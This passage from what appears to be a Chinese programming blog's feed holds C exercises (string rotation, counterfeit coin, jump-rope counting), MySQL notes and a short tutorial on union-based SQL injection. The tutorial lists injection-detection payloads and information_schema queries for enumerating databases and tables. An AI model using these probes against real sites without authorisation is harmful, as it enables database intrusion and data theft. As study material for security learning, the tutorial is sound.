class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="神奇的方法"><a href="#神奇的方法" class="headerlink" title="神奇的方法"></a>神奇的方法</h3><p>比如A B C D E F  k &#x3D; 2<br>先逆序 A B  再逆序D E F<br>得到 B A F E D<br>再整体逆序得到<br>D E F A B<br>神奇<br>代码实现加个之前写过的逆序即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>* left, <span class="type">char</span>* right)</span></span><br><span class="line">&#123; </span><br><span class="line">assert(left);</span><br><span class="line">assert(right); </span><br><span class="line"><span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line"><span class="type">char</span> tmp = *left;</span><br><span class="line">*left = *right;</span><br><span class="line">*right = tmp;</span><br><span class="line">left++;</span><br><span class="line">right--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">string_rotate</span><span class="params">(<span class="type">char</span>* str, <span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str);</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line">reverse(str, str + k - <span class="number">1</span>);<span class="comment">//左 </span></span><br><span class="line">reverse(str + k, str + n - <span class="number">1</span>);<span class="comment">//右 </span></span><br><span class="line">reverse(str, str + n - <span class="number">1</span>);<span class="comment">//整体 </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">10</span>] = <span class="string">&quot;ABCDEF&quot;</span>; </span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">string_rotate(arr, k);</span><br><span class="line"><span class="built_in">puts</span>(arr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="进一步深入"><a href="#进一步深入" class="headerlink" title="进一步深入"></a>进一步深入</h2><p>写一个函数，判断一个字符串是否是另外一个字符串旋转之后的字符串。</p><h2 id="例：-1"><a href="#例：-1" class="headerlink" title="例："></a>例：</h2><p>给定s1&#x3D;AABCD和s2&#x3D;BCDAA,返回1<br>给定s1&#x3D;abcd和s2&#x3D;ACBD,返回0</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>每转一次都比较以下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_string_rotate</span><span class="params">(<span class="type">char</span>* str1, <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">strlen</span>(str1);<span class="comment">//5</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="comment">//每次左旋一个字符</span></span><br><span class="line"><span class="type">char</span> tmp = *str1;</span><br><span class="line"><span class="comment">// 把后面的n-1个字符往前挪 </span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span>; j++) &#123;</span><br><span class="line">*(str1 + j) = *(str1 + j + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//tmp再放到最后</span></span><br><span class="line">*(str1 + n - <span class="number">1</span>) = tmp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(str1, str2) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[] = <span class="string">&quot;AABCD&quot;</span>; </span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;BCDAA&quot;</span>;  </span><br><span class="line"><span class="type">int</span> ret = is_string_rotate(arr1, arr2);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><h3 id="神奇的方法-1"><a href="#神奇的方法-1" class="headerlink" title="神奇的方法"></a>神奇的方法</h3><p>将AABCD重复俩遍可以得到所有的反转<br>AABCDAABCD<br>A ABCDA ABCD<br>AA BCDAA BCD<br>………</p><p>改版后的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_string_rotate</span><span class="params">(<span class="type">char</span>* str1, <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(str1);</span><br><span class="line">assert(str2);</span><br><span class="line"><span class="comment">//长度不相等，肯定不是 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(str1) != <span class="built_in">strlen</span>(str2))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1.str1字符串的后边追加一个str1</span></span><br><span class="line"><span class="comment">//AABCDAABCD</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">strlen</span>(str1); </span><br><span class="line"><span class="built_in">strncat</span>(str1, str1, n);<span class="comment">//追加后面的字符串前n个在前面的字符串 </span></span><br><span class="line"><span class="comment">//2.判断str2是否为str1的子串 </span></span><br><span class="line"><span class="built_in">strstr</span>(str1, str2);<span class="comment">//判断一个字符串是否是另一个字符串的子串 </span></span><br><span class="line"><span class="comment">//返回找到的str2在str1第一次匹配的地址 </span></span><br><span class="line"><span class="type">char</span>* ret = <span class="built_in">strstr</span>(str1, str2);</span><br><span class="line"><span class="keyword">return</span> ret != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr1[<span class="number">20</span>] = <span class="string">&quot;AABCD&quot;</span>; </span><br><span class="line"><span class="type">char</span> arr2[] = <span class="string">&quot;BCDAA&quot;</span>;  </span><br><span class="line"><span class="type">int</span> ret = is_string_rotate(arr1, arr2);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模中的问题C解决</title>
      <link href="/2023/03/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98C%E8%A7%A3%E5%86%B3/"/>
      <url>/2023/03/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98C%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="假币问题"><a href="#假币问题" class="headerlink" title="假币问题"></a>假币问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>利有 12 枚银币。其中有 11 枚真币和 1 枚假币。假币看起来和真币没有区别，但是重量不同。但赛利不知道假币比真币轻还是重。于是他向朋友借了一架天平。朋友希望赛利称三次<br>就能找出假币并且确定假币是轻是重。例如:如果赛利用天平称两枚硬币，发现天平平衡，说明两枚都是真的。如果赛利用一枚真币与另一枚银币比较，发现它比真币轻或重，说明它是假币。经过精心安排每次的称量，赛利保证在称三次后确定假币。</p><p><em>Input：</em></p><p>输入有三行，每行表示一次称量的结果。赛利事先将银币标号为 A-L。每次称量的结果用三个以空格隔开的字符串表示： 天平左边放置的硬币 天平右边放置的硬币 平衡状态。 其中平衡状态用，up, down, 或 even表示, 分别为右端高、右端低和平衡。天平左右的硬币数总是相等的。</p><p><em>Output：</em></p><p>输出哪一个标号的银币是假币，并说明它比真币轻还是重(heavy or light)。<br>Sample Input<br>1<br>ABCD EFGH even<br>ABCI EFJK up<br>ABIJ EFGH even<br>Sample Output<br>K is the counterfeit coin and it is light</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>核心（枚举）</p><p>首先，每一个标号的银币都可能是假币，所以需要对每个银币都进行分析，其次题目没说假币是更重还是更轻，所以又要再分俩种情况。</p><p>具体实现则是，读入三次称重结果，对每一枚银币，分更重和更轻俩种情况讨论，看哪种符合读入的结果。</p><p>比如这次的输入，ABCD EFGH even,说明假币不可能在这8枚银币里，但程序仍会对A-H进行分析，再分析I，先假设I更轻，第二个就不满足了，因为up表示右边高，I排除，再分析J，同样<br>先假设J更轻，第三个就不满足了，最后剩一个K，先假设更轻，刚好满足第二个条件。</p><p>所以程序需要实现的就是这三个过程，遍历A-L，假币更重比较一次，假币更轻比较一次。</p><p>用到了strchr(const char str[], int c)，如果在字符串 str 中找到字符 c，则函数返回指向该字符的指针，如果未找到该字符则返回 NULL。假币在天平上肯定出现不平衡，所以找出事先假设好的假币在哪边，再判断。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _NO_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> left[<span class="number">3</span>][<span class="number">7</span>];<span class="comment">//天平左边的银币</span></span><br><span class="line"><span class="type">char</span> right[<span class="number">3</span>][<span class="number">7</span>];<span class="comment">//天平右边的银币</span></span><br><span class="line"><span class="type">char</span> result[<span class="number">3</span>][<span class="number">7</span>];<span class="comment">//称量结果</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCounterfeitCoin</span><span class="params">(<span class="type">char</span> iCoin, <span class="type">bool</span> isLight)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);<span class="comment">//t组数据，一组三次</span></span><br><span class="line"><span class="keyword">while</span> (t--) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s %s %s&quot;</span>, &amp;left[i], &amp;right[i], &amp;result[i]);</span><br><span class="line"><span class="comment">//枚举每个银币</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">char</span> iCoin = <span class="string">&#x27;A&#x27;</span>; iCoin &lt;= <span class="string">&#x27;L&#x27;</span>; iCoin++)</span><br><span class="line"><span class="keyword">if</span> (isCounterfeitCoin(iCoin, <span class="literal">true</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c is the counterfeit coin and it is light.\n&quot;</span>, iCoin);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (isCounterfeitCoin(iCoin, <span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c is the counterfeit coin and it is heavy.\n&quot;</span>, iCoin);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCounterfeitCoin</span><span class="params">(<span class="type">char</span> iCoin, <span class="type">bool</span> isLight)</span><span class="comment">/*isLight为真则表示假币为轻，否则假币为重*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line"><span class="comment">//指向天平俩边的字符串</span></span><br><span class="line"><span class="type">char</span>* pleft;</span><br><span class="line"><span class="type">char</span>* pright;</span><br><span class="line"><span class="keyword">if</span> (isLight) &#123;</span><br><span class="line">pleft = left[i];</span><br><span class="line">pright = right[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">/*如果假设假币是重的isLight为假的，则把称量结果左右对换*/</span></span><br><span class="line">pleft = right[i];</span><br><span class="line">pright = left[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (result[i][<span class="number">0</span>]) &#123;<span class="comment">/*天平右边的情况*/</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>: <span class="comment">// up</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(pright, iCoin) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>: <span class="comment">//even</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(pleft, iCoin) || <span class="built_in">strchr</span>(pright, iCoin))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(pleft, iCoin) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/24/9rDY8LeZRhTmzb6.png" alt="image.png"></p><h1 id="跳绳为题-参考自："><a href="#跳绳为题-参考自：" class="headerlink" title="跳绳为题(参考自：)"></a>跳绳为题(参考自：)</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>朋友玩跳绳比赛,要计算在一分钟内跳了多少下.假设每秒钟跳一下,如果中途失败了,则要<br>花三秒钟后才能开始重跳.一般小朋友跳绳一分钟要跳坏好几次.现在给出小朋友每次跳坏时<br>已经跳的总数,求小朋友在一分钟内跳了多少下.(请注意分析示例数据.)</p><p><em>Input:</em></p><p>第一行为 n 个小朋友<br>其余各行,每行第一个整数是跳坏的次数 m,其余 m 个整数是跳坏时累计跳了多少下.</p><p><em>Output:</em></p><p>输出相应小朋友头一分钟内跳了多少下.</p><p>Sample Input</p><p>603<br>12 23 451 17<br>4 10 20 30 40<br>5 10 20 30 40 58<br>6 10 20 30 40 47 60</p><p>Sample Output</p><p>60<br>51<br>57<br>48<br>48<br>47<br>Hint</p><p>提示,在跳绳比赛时,你可能已经超时了,但自己还在计数,但裁判已经停止计时并得到成绩.<br>这里相当与自己计数.因此,并非跳坏的时候都是在前一分钟以内.请注意分析示例数据</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n, m, x, i, ok, time, s;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (n--)</span><br><span class="line">&#123;</span><br><span class="line">time = ok = s = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">time = x + <span class="number">3</span> * i;<span class="comment">//每次停下来后已经用的时间</span></span><br><span class="line"><span class="keyword">if</span> (ok == <span class="number">0</span>)<span class="comment">//未超过一分钟...</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (time &gt;= <span class="number">57</span>)</span><br><span class="line">&#123;</span><br><span class="line">ok = <span class="number">1</span>;</span><br><span class="line">time = (time &gt; <span class="number">60</span>) ? <span class="number">60</span> : time;<span class="comment">//最多跳60次</span></span><br><span class="line">s = time - <span class="number">3</span> * i;</span><br><span class="line"><span class="comment">//剩余的时间不够下一次重新跳了</span></span><br><span class="line"><span class="comment">//跳的次数等于用的时间减去停下来消耗的时间 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (time &lt; <span class="number">57</span> &amp;&amp; i == m - <span class="number">1</span>)</span><br><span class="line"><span class="comment">//最后一次停下来，但是不够60s </span></span><br><span class="line">&#123;</span><br><span class="line">s = <span class="number">60</span> - <span class="number">3</span> * (i + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//这一次后面肯定还要有三秒停下来的时间 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (m == <span class="number">0</span>) ? <span class="number">60</span> : s);<span class="comment">//特判未停下来的情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/62vp1H7AQYmB9TW.png" alt="image.png"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联合查询输入</title>
      <link href="/2023/03/18/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BE%93%E5%85%A5/"/>
      <url>/2023/03/18/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="联合查询输入-来自：sechub"><a href="#联合查询输入-来自：sechub" class="headerlink" title="联合查询输入 来自：sechub"></a>联合查询输入 来自：sechub</h1><h2 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h2><p>我们可能存在SQL注入变量的后边添加以下payload：</p><ul><li>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整型判断）</li><li>单引号判断’显示数据库错误信息或者页面回显不同（整型，字符串类型判断）</li><li>\ (转义符)</li><li>-1 &#x2F; +1 回显下一个或上一个页面 （整型判断）</li></ul><p>注：加号’+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p><h2 id="2-判断是整型注入还是字符型注入"><a href="#2-判断是整型注入还是字符型注入" class="headerlink" title="2.判断是整型注入还是字符型注入"></a>2.判断是整型注入还是字符型注入</h2><p>数字型与字符型的最大区别在于：<br>    数字类型不需要引号闭合，而字符类型需要使用引号闭合。</p><p>数字型：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>字符型:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="3-根据不同的分类进行注入"><a href="#3-根据不同的分类进行注入" class="headerlink" title="3.根据不同的分类进行注入"></a>3.根据不同的分类进行注入</h2><p>根据SQL注入语法分类：</p><ul><li>UNION query SQL injection(可联合查询注入)</li><li>Error-based SQL injection(报错型注入)</li><li>Boolean-based blind SQL injection(基于布尔型注入)</li><li>Time-based blind SQL injection(基于时间延迟注入)</li><li>Stacked queries SQL injection(可多语句查询注入)</li></ul><h3 id="3-1-MySQL中UNION使用规则"><a href="#3-1-MySQL中UNION使用规则" class="headerlink" title="3.1 MySQL中UNION使用规则"></a>3.1 MySQL中UNION使用规则</h3><p>UNION的作用时间俩个或多个select语句查询结果合并起来</p><ul><li>UNION必须由俩条或俩条以上的select语句组成，语句之间用UNION分隔</li><li>UNION中的每个查询的列数必须相同</li><li>UNION会从查询结果集中自动去除重复行</li></ul><h3 id="3-2-判断查询列数"><a href="#3-2-判断查询列数" class="headerlink" title="3.2 判断查询列数"></a>3.2 判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照制定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段位1，第二个位2，以此类推，我们可以通过二分猜解列数。<br>例：</p><p>order by 1</p><p>order by 20</p><p>order by 10</p><h3 id="3-3-获取所有数据库名"><a href="#3-3-获取所有数据库名" class="headerlink" title="3.3 获取所有数据库名"></a>3.3 获取所有数据库名</h3><p>group_concat()一次性显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>limit逐一显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(SCHEMA_NAME) <span class="keyword">FROM</span> information_schema.schemata #查询数据库个数</span><br><span class="line"><span class="keyword">select</span> SCHEMA_NAME <span class="keyword">from</span> information_schema.SCHEMATA limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="3-4-获取数据库-test-所有表名"><a href="#3-4-获取数据库-test-所有表名" class="headerlink" title="3.4 获取数据库(test)所有表名"></a>3.4 获取数据库(test)所有表名</h3><p>group_concat()一次性显示：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p>limi 逐一显示</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.SCHEMATA <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="4-联合查询"><a href="#4-联合查询" class="headerlink" title="4.联合查询"></a>4.联合查询</h2><p>前提条件：页面上有显示位</p><p>什么是显示位？</p><p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫<em>显示位</em></p><h2 id="5-过程"><a href="#5-过程" class="headerlink" title="5.过程"></a>5.过程</h2><p><img src="https://s2.loli.net/2023/03/18/3TneEwuYtpIokxd.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习笔记</title>
      <link href="/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/12/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p123456 <span class="comment">--登陆时密码-p后不能有空格</span></span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> Host <span class="operator">=</span> <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">--修改用户密码</span></span><br><span class="line">flush privileges; <span class="comment">-- 刷新权限</span></span><br><span class="line">所有语句结尾都是用;结尾</span><br><span class="line"><span class="keyword">show</span> databases; <span class="comment">-- 查看所有数据库</span></span><br><span class="line">mysql<span class="operator">&gt;</span> use home <span class="comment">-- 切换数据库 use 数据库名</span></span><br><span class="line"><span class="keyword">show</span> tables; <span class="comment">-- 查看数据库中所有的表</span></span><br><span class="line"><span class="keyword">describe</span> student; <span class="comment">-- 显示数据库中所有信息</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/PlXSLUocQie21Wz.png" alt="image.png"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database westos; <span class="comment">-- 创建一个数据库</span></span><br><span class="line"></span><br><span class="line">exit; <span class="comment">-- 退出连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 单行注释(SQL的本来的注释)</span></span><br><span class="line"><span class="comment">/*SQL多行注释</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据库xxx语言 CRUD增删改查</p><p>DDL 定义</p><p>DML 操作</p><p>DQL 查询</p><p>DCL 控制</p><h1 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h1><p>操作数据库-&gt;操作数据库中的表-&gt;操作数据库中表的数据</p><p>mysql 关键字不区分大小写 </p><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1. 创建数据库"></a>1. 创建数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> westos;</span><br></pre></td></tr></table></figure><h2 id="2-删除数据库"><a href="#2-删除数据库" class="headerlink" title="2. 删除数据库"></a>2. 删除数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> westos;</span><br></pre></td></tr></table></figure><h2 id="3-使用数据库"><a href="#3-使用数据库" class="headerlink" title="3. 使用数据库"></a>3. 使用数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- tab键上面，如果你的表名或者字段名时一个特殊字符，就需要带 ( ` )</span></span><br><span class="line">USE home;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/Ew4zWRp1nCgAbIv.png" alt="image.png"></p><h2 id="4-查看数据库"><a href="#4-查看数据库" class="headerlink" title="4. 查看数据库"></a>4. 查看数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; <span class="comment">--查看所有数据可</span></span><br></pre></td></tr></table></figure><p>学习思路<br>    - 对照SQLyog可视化，然后在历史记录里查看<br>    - 固定的语法或关键字必须强行记住</p><h1 id="数据库的数据类型"><a 